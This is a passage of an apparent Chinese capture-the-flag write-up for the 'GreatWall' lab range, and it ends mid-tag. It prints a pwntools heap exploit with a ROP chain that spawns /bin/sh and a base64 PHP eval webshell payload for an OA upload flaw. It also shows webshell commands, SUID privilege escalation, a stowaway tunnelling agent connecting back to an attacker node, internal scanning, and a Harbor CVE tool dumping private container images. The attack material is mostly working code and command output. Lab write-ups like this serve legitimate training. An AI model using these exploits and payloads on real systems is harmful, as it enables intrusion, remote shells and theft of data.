p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Key:'\u003c/span\u003e,key)\n    p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Data:'\u003c/span\u003e,data)\n\ndef name(username):\n    p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Option:'\u003c/span\u003e,b\u003cspan class=\"hljs-string\"\u003e'4'\u003c/span\u003e)\n    p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'name:'\u003c/span\u003e,username)\n\np = remote(\u003cspan class=\"hljs-string\"\u003e'172.28.23.33'\u003c/span\u003e, 59696)\n\u003cspan class=\"hljs-comment\"\u003e# p = process('./HashNote')\u003c/span\u003e\n\nusername=0x5dc980\nstack=0x5e4fa8\nukey=b\u003cspan class=\"hljs-string\"\u003e'\\x30'\u003c/span\u003e*5+b\u003cspan class=\"hljs-string\"\u003e'\\x31'\u003c/span\u003e+b\u003cspan class=\"hljs-string\"\u003e'\\x44'\u003c/span\u003e\n\nfake_chunk=flat({\n    0:username+0x10,\n    0x10:[username+0x20,len(ukey),\\\n        ukey,0],\n    0x30:[stack,0x10]\n    },filler=b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e)\n\np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'name'\u003c/span\u003e,fake_chunk)\np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'word'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'freep@ssw0rd:3'\u003c/span\u003e)\n\nadd(b\u003cspan class=\"hljs-string\"\u003e'\\x30'\u003c/span\u003e*1+b\u003cspan class=\"hljs-string\"\u003e'\\x31'\u003c/span\u003e+b\u003cspan class=\"hljs-string\"\u003e'\\x44'\u003c/span\u003e,b\u003cspan class=\"hljs-string\"\u003e'test'\u003c/span\u003e)   \u003cspan class=\"hljs-comment\"\u003e# 126\u003c/span\u003e\nadd(b\u003cspan class=\"hljs-string\"\u003e'\\x30'\u003c/span\u003e*2+b\u003cspan class=\"hljs-string\"\u003e'\\x31'\u003c/span\u003e+b\u003cspan class=\"hljs-string\"\u003e'\\x44'\u003c/span\u003e,b\u003cspan class=\"hljs-string\"\u003e'test'\u003c/span\u003e)   \u003cspan class=\"hljs-comment\"\u003e# 127\u003c/span\u003e\n\nshow(ukey)\nmain_ret=u64(p.read(8))-0x1e0\n\nrdi=0x0000000000405e7c \u003cspan class=\"hljs-comment\"\u003e# pop rdi ; ret\u003c/span\u003e\nrsi=0x000000000040974f \u003cspan class=\"hljs-comment\"\u003e# pop rsi ; ret\u003c/span\u003e\nrdx=0x000000000053514b \u003cspan class=\"hljs-comment\"\u003e# pop rdx ; pop rbx ; ret\u003c/span\u003e\nrax=0x00000000004206ba \u003cspan class=\"hljs-comment\"\u003e# pop rax ; ret\u003c/span\u003e\nsyscall=0x00000000004560c6 \u003cspan class=\"hljs-comment\"\u003e# syscall\u003c/span\u003e\n\nfake_chunk=flat({\n    0:username+0x20,\n    0x20:[username+0x30,len(ukey),\\\n        ukey,0],\n    0x40:[main_ret,0x100,b\u003cspan class=\"hljs-string\"\u003e'/bin/sh\\x00'\u003c/span\u003e]\n    },filler=b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e)\n\nname(fake_chunk.ljust(0x80,b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\npayload=flat([\n    rdi,username+0x50,\n    rsi,0,\n    rdx,0,0,\n    rax,0x3b,\n    syscall\n    ])\n\np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Option:'\u003c/span\u003e,b\u003cspan class=\"hljs-string\"\u003e'3'\u003c/span\u003e)\np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Key:'\u003c/span\u003e,ukey)\np.sendline(payload)\np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Option:'\u003c/span\u003e,b\u003cspan class=\"hljs-string\"\u003e'9'\u003c/span\u003e)\np.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pycryptodome)  ⚡ root@kali  ~/Desktop/test/greatwall  proxychains4 -q python exp.py\n[+] Opening connection to 172.28.23.33 on port 59696: Done\n/root/Desktop/test/greatwall/exp.py:39: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'word'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'freep@ssw0rd:3'\u003c/span\u003e)\n[*] Switching to interactive mode\n Invalid!$  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eroot\u003c/code\u003e目录下存在\u003ccode\u003eflag03\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e f1ag03.txt\nflag03: flag{6a326f94-6526-4586-8233-152d137281fd}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e172.28.23.26 - 新翔OA\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image45.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e之前\u003ccode\u003efscan\u003c/code\u003e扫描的时候\u003ccode\u003eFTP\u003c/code\u003e是可以进行匿名登陆的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/greatwall  proxychains4 -q ftp 172.28.23.26\nConnected to 172.28.23.26.\n220 (vsFTPd 3.0.3)\nName (172.28.23.26:root): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e is UNIX.\nUsing binary mode to transfer files.\n-rw-r--r--    1 0        0         7536672 Mar 23  2024 OASystem.zip\n226 Directory send OK.\nftp\u003e mget *\nmget OASystem.zip [anpqy?]? \u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e\n229 Entering Extended Passive Mode (|||38378|)\n150 Opening BINARY mode data connection \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e OASystem.zip (7536672 bytes).\n100% |***************************************************************************************************************************************************************************************|  7360 KiB    1.67 MiB/s    00:00 ETA\n226 Transfer complete.\n7536672 bytes received \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00:04 (1.67 MiB/s)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到一个压缩包\u003ccode\u003eOASystem.zip\u003c/code\u003e 应该是要进行代码审计了（悲，心疼沙砾）\u003c/p\u003e\n\u003cp\u003e先不代码审计，通过搜索引擎来搜索公开漏洞，能找到在前台有个任意文件上传漏洞\u003c/p\u003e\n\u003cp\u003e漏洞出现在\u003ccode\u003euploadbase64.php\u003c/code\u003e中：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/greatwall/OAsystem  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e uploadbase64.php \n\u0026#x3C;?php\n/**\n * Description: PhpStorm.\n * Author: yoby\n * DateTime: 2018/12/4 18:01\n * Email:logove@qq.com\n * Copyright Yoby版权所有\n */\n\u003cspan class=\"hljs-variable\"\u003e$img\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'imgbase64'\u003c/span\u003e];\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (preg_match(\u003cspan class=\"hljs-string\"\u003e'/^(data:\\s*image\\/(\\w+);base64,)/'\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$img\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$result\u003c/span\u003e)) {\n    \u003cspan class=\"hljs-variable\"\u003e$type\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\".\"\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$result\u003c/span\u003e[2];\n    \u003cspan class=\"hljs-variable\"\u003e$path\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"upload/\"\u003c/span\u003e . \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Y-m-d\"\u003c/span\u003e) . \u003cspan class=\"hljs-string\"\u003e\"-\"\u003c/span\u003e . uniqid() . \u003cspan class=\"hljs-variable\"\u003e$type\u003c/span\u003e;\n}\n\u003cspan class=\"hljs-variable\"\u003e$img\u003c/span\u003e =  base64_decode(str_replace(\u003cspan class=\"hljs-variable\"\u003e$result\u003c/span\u003e[1], \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$img\u003c/span\u003e));\n@file_put_contents(\u003cspan class=\"hljs-variable\"\u003e$path\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$img\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'{\"src\":\"'\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$path\u003c/span\u003e.\u003cspan class=\"hljs-string\"\u003e'\"}'\u003c/span\u003e);#    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e只需满足\u003ccode\u003epreg_match\u003c/code\u003e条件就能上传，而且参数可控\u003c/p\u003e\n\u003cp\u003epayload：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edata:image/php;\u003cspan class=\"hljs-built_in\"\u003ebase64\u003c/span\u003e,PD9waHAgQGV2YWwoJF9QT1NUWycxJ10pOw==\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过最后解码能解码成一句话木马\u003ccode\u003e\u0026#x3C;?php @eval($_POST['1']);\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e梭哈！\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image46.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试一下木马是否能正常使用，正常\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image47.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003eAntSword连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image48.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在根目录能找到\u003ccode\u003eflag02\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image49.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是发现不能读取，进到虚拟终端，发现回显都是\u003ccode\u003eret=127\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image50.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这是被**\u003ccode\u003eDisable Functions\u003c/code\u003e** 给限制了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image51.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e刚好 AntSword 的插件能绕过\u003ccode\u003eDisable Functions\u003c/code\u003e 的限制\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image52.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们在重新连接到插件上传的新马，但是测试连接时出现了返回数据为空\u003c/p\u003e\n\u003cp\u003e最后通过**\u003ccode\u003eBacktrace UAF\u003c/code\u003e** 能直接获得shell\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image53.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接读取\u003ccode\u003eflag02\u003c/code\u003e发现还是不能读取，查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(www-data:/) $ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al flag02.txt\n-r--------   1 root root    51 Mar 14  2024 flag02.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现需要提权，寻找\u003ccode\u003eSUID\u003c/code\u003e权限文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(www-data:/) $ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f 2\u003e/dev/null\n/bin/fusermount\n/bin/ping6\n/bin/mount\n/bin/su\n/bin/ping\n/bin/umount\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/at\n/usr/bin/staprun\n/usr/bin/base32\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/s-nail/s-nail-privsep\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现\u003ccode\u003e/usr/bin/base32\u003c/code\u003e ，像是可以将文件以\u003ccode\u003ebase32\u003c/code\u003e输出，尝试执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(www-data:/) $ /usr/bin/base32 /flag02.txt\nMZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRD\nEOD5BI======\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ebase32\u003c/code\u003e解码得到\u003ccode\u003eflag02\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/greatwall/OAsystem  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"MZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRDEOD5BI======\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003ebase32\u003c/span\u003e -d\nflag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里想要进行反弹 \u003ccode\u003eshell\u003c/code\u003e ，但是发现通过\u003ccode\u003eBacktrace UAF\u003c/code\u003e 获得的终端没办法反弹，通过搜索引擎得知，环境中无法使用\u003ccode\u003epost\u003c/code\u003e的马，要使用\u003ccode\u003eget\u003c/code\u003e的马\u003c/p\u003e\n\u003cp\u003e新建一个\u003ccode\u003eGET\u003c/code\u003e的马\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image54.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e修改\u003ccode\u003e.antproxy.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image55.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image56.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e二层代理搭建\u003c/h2\u003e\n\u003cp\u003e通过antsword上传\u003ccode\u003estowaway\u003c/code\u003e到\u003ccode\u003e172.28.23.26\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e通过一句话木马给予执行权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehttp://172.28.23.26/upload/.antproxy.php?1=system(\u003cspan class=\"hljs-string\"\u003e'chmod %2Bx linux_x64_agent'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003estowaway\u003c/code\u003e 服务端的第一个node节点中开启\u003ccode\u003elisten\u003c/code\u003e 10000端口，也就是\u003ccode\u003e172.28.23.17\u003c/code\u003e 监听\u003ccode\u003e10000\u003c/code\u003e端口，等待\u003ccode\u003e172.28.23.26\u003c/code\u003e 来连接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(node 0) \u003e\u003e listen\n[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you\u003cspan class=\"hljs-string\"\u003e're controlling was started in the corresponding way!\n[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!\n[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1\n[*] Please input the [ip:]\u0026#x3C;port\u003e : 10000\n[*] Waiting for response......\n[*] Node is listening on 10000\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过一句话木马进行连接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehttp://172.28.23.26/upload/.antproxy.php?1=system(\u003cspan class=\"hljs-string\"\u003e'./linux_x64_agent -c 172.28.23.17:10000 -s 123 --reconnect 8'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003estowaway\u003c/code\u003e 服务端接收到新节点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(admin) \u003e\u003e\n[*] New node online! Node \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e is 1\n(admin) \u003e\u003e\n[*] Please use \u003cspan class=\"hljs-string\"\u003e'exit'\u003c/span\u003e to \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e stowaway or use \u003cspan class=\"hljs-string\"\u003e'back'\u003c/span\u003e to \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e to parent panel\n[*] Unknown Command!\n\n        \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e                                                    Show \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e information\n        detail                                                  Display connected nodes\u003cspan class=\"hljs-string\"\u003e' detail\n        topo                                                    Display nodes'\u003c/span\u003e topology\n        use        \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\u003e                                         Select the target node you want to use\n        \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e                                                    Exit Stowaway\n\n(admin) \u003e\u003e detail\nNode[0] -\u003e IP: 8.130.146.145:46344  Hostname: portal  User: www-data\nMemo:\n\nNode[1] -\u003e IP: 172.28.23.26:50314  Hostname: Null  User: Null\nMemo:\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过新节点开启\u003ccode\u003esocks\u003c/code\u003e服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(admin) \u003e\u003e use 1\n(node 1) \u003e\u003e socks 1081 admin admin\n[*] Trying to listen on 0.0.0.0:1081......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Socks start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e内网信息收集 - 2\u003c/h2\u003e\n\u003cp\u003e（这部分做麻烦了，不如在上一步做端口转发）\u003c/p\u003e\n\u003cp\u003e通过\u003ccode\u003eBacktrace UAF\u003c/code\u003e 获得的终端收集内网\u003ccode\u003eIP\u003c/code\u003e信息，\u003ccode\u003e172.22.14.x/24\u003c/code\u003e 是二层内网网段\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(www-data:/var/www/html/OAsystem/upload) $ ip add\n1: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 00:16:3e:0c:c8:c9 brd ff:ff:ff:ff:ff:ff\n    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe0c:c8c9/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \n       valid_lft forever preferred_lft forever\n3: eth1: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 00:16:3e:0c:c8:a0 brd ff:ff:ff:ff:ff:ff\n    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe0c:c8a0/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在通过\u003ccode\u003eBacktrace UAF\u003c/code\u003e 获得的终端进行\u003ccode\u003efscan\u003c/code\u003e扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(www-data:/var/www/html/OAsystem/upload) $ ./fscan_1.8.4 -h 172.22.14.1-255 \u003e 1.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003estart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.22.14.6     is alive\n(icmp) Target 172.22.14.37    is alive\n(icmp) Target 172.22.14.46    is alive\n[*] Icmp alive hosts len is: 3\n172.22.14.46:80 open\n172.22.14.46:22 open\n172.22.14.37:22 open\n172.22.14.6:80 open\n172.22.14.6:22 open\n172.22.14.6:21 open\n172.22.14.37:10250 open\n172.22.14.37:2379 open\n[*] alive ports len is: 8\nstart vulscan\n[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor\n[*] WebTitle http://172.22.14.6        code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413\n[+] InfoScan http://172.22.14.46       [Harbor] \n[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None\n[+] ftp 172.22.14.6:21:anonymous \n   [-\u003e]OASystem.zip\n[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e172.22.14.46 - Harbor\u003c/h2\u003e\n\u003cp\u003e访问，采集指纹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image57.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上面 fscan 扫描出 \u003ccode\u003epoc-yaml-swagger-ui-unauth\u003c/code\u003e 应该是接口泄露\u003c/p\u003e\n\u003cp\u003e通过搜索引擎检索，发现是未授权访问，通过\u003ccode\u003eGitHub\u003c/code\u003e寻找利用：\u003ca href=\"https://github.com/404tk/CVE-2022-46463\"\u003ehttps://github.com/404tk/CVE-2022-46463\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463  proxychains -q python3 harbor.py http://172.22.14.46                           \n[*] API version used v2.0\n[+] project/projectadmin\n[+] project/portal\n[+] library/nginx\n[+] library/redis\n[+] harbor/secret\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eharbor/secret\u003c/code\u003e 看着像是我们感兴趣的，\u003ccode\u003eproject/projectadmin\u003c/code\u003e也像是，Dump下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463  proxychains -q python3 harbor.py http://172.22.14.46 --dump harbor/secret --v2\n[+] Dumping : harbor/secret:latest\n    [+] Downloading : 58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50\n/root/Desktop/test/greatwall/CVE-2022-46463/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.\n  tf.extractall(f\u003cspan class=\"hljs-string\"\u003e\"{CACHE_PATH}{dir}/{name}\"\u003c/span\u003e)\n    [+] Downloading : b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01\n    [+] Downloading : da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1\n    [+] Downloading : fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e\n    [+] Downloading : 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49\n    [+] Downloading : 8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463  proxychains -q python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2\n[+] Dumping : project/projectadmin:latest\n    [+] Downloading : 63e9bbe323274e77e58d77c6ab6802d247458f784222fbb07a2556d6ec74ee05\n/root/Desktop/test/greatwall/CVE-2022-46463/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.\n  tf.extractall(f\u003cspan class=\"hljs-string\"\u003e\"{CACHE_PATH}{dir}/{name}\"\u003c/span\u003e)\n    [+] Downloading : a1ae0db7d6c6f577c8208ce5b780ad362ef36e69d068616ce9188ac1cc2f80c6\n    [+] Downloading : 70437571d98143a3479eaf3cc5af696ea79710e815d16e561852cf7d429736bd\n    [+] Downloading : ae0fa683fb6d89fd06e238876769e2c7897d86d7546a4877a2a4d2929ed56f2c\n    [+] Downloading : 90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e分析\u003ccode\u003eharbor/secret\u003c/code\u003e 的镜像文件，能找到\u003ccode\u003eflag05\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest  \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49\n58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50\n8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653\nb51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01\nbuild_history.txt\nda8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1\nfb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e\n ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest  \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49 \n ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49  \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e                                                                 \nf1ag05_Yz1o.txt  run.sh\n ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e f1ag05_Yz1o.txt                                                \nflag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e分析\u003ccode\u003eproject/projectadmin\u003c/code\u003e 的镜像文件，能找到**\u003ccode\u003eProjectAdmin-0.0.1-SNAPSHOT.jar\u003c/code\u003e** ，并且在\u003ccode\u003erun.sh\u003c/code\u003e中运行了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/project_projectadmin/latest/90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e run.sh                                                         \n\u003cspan 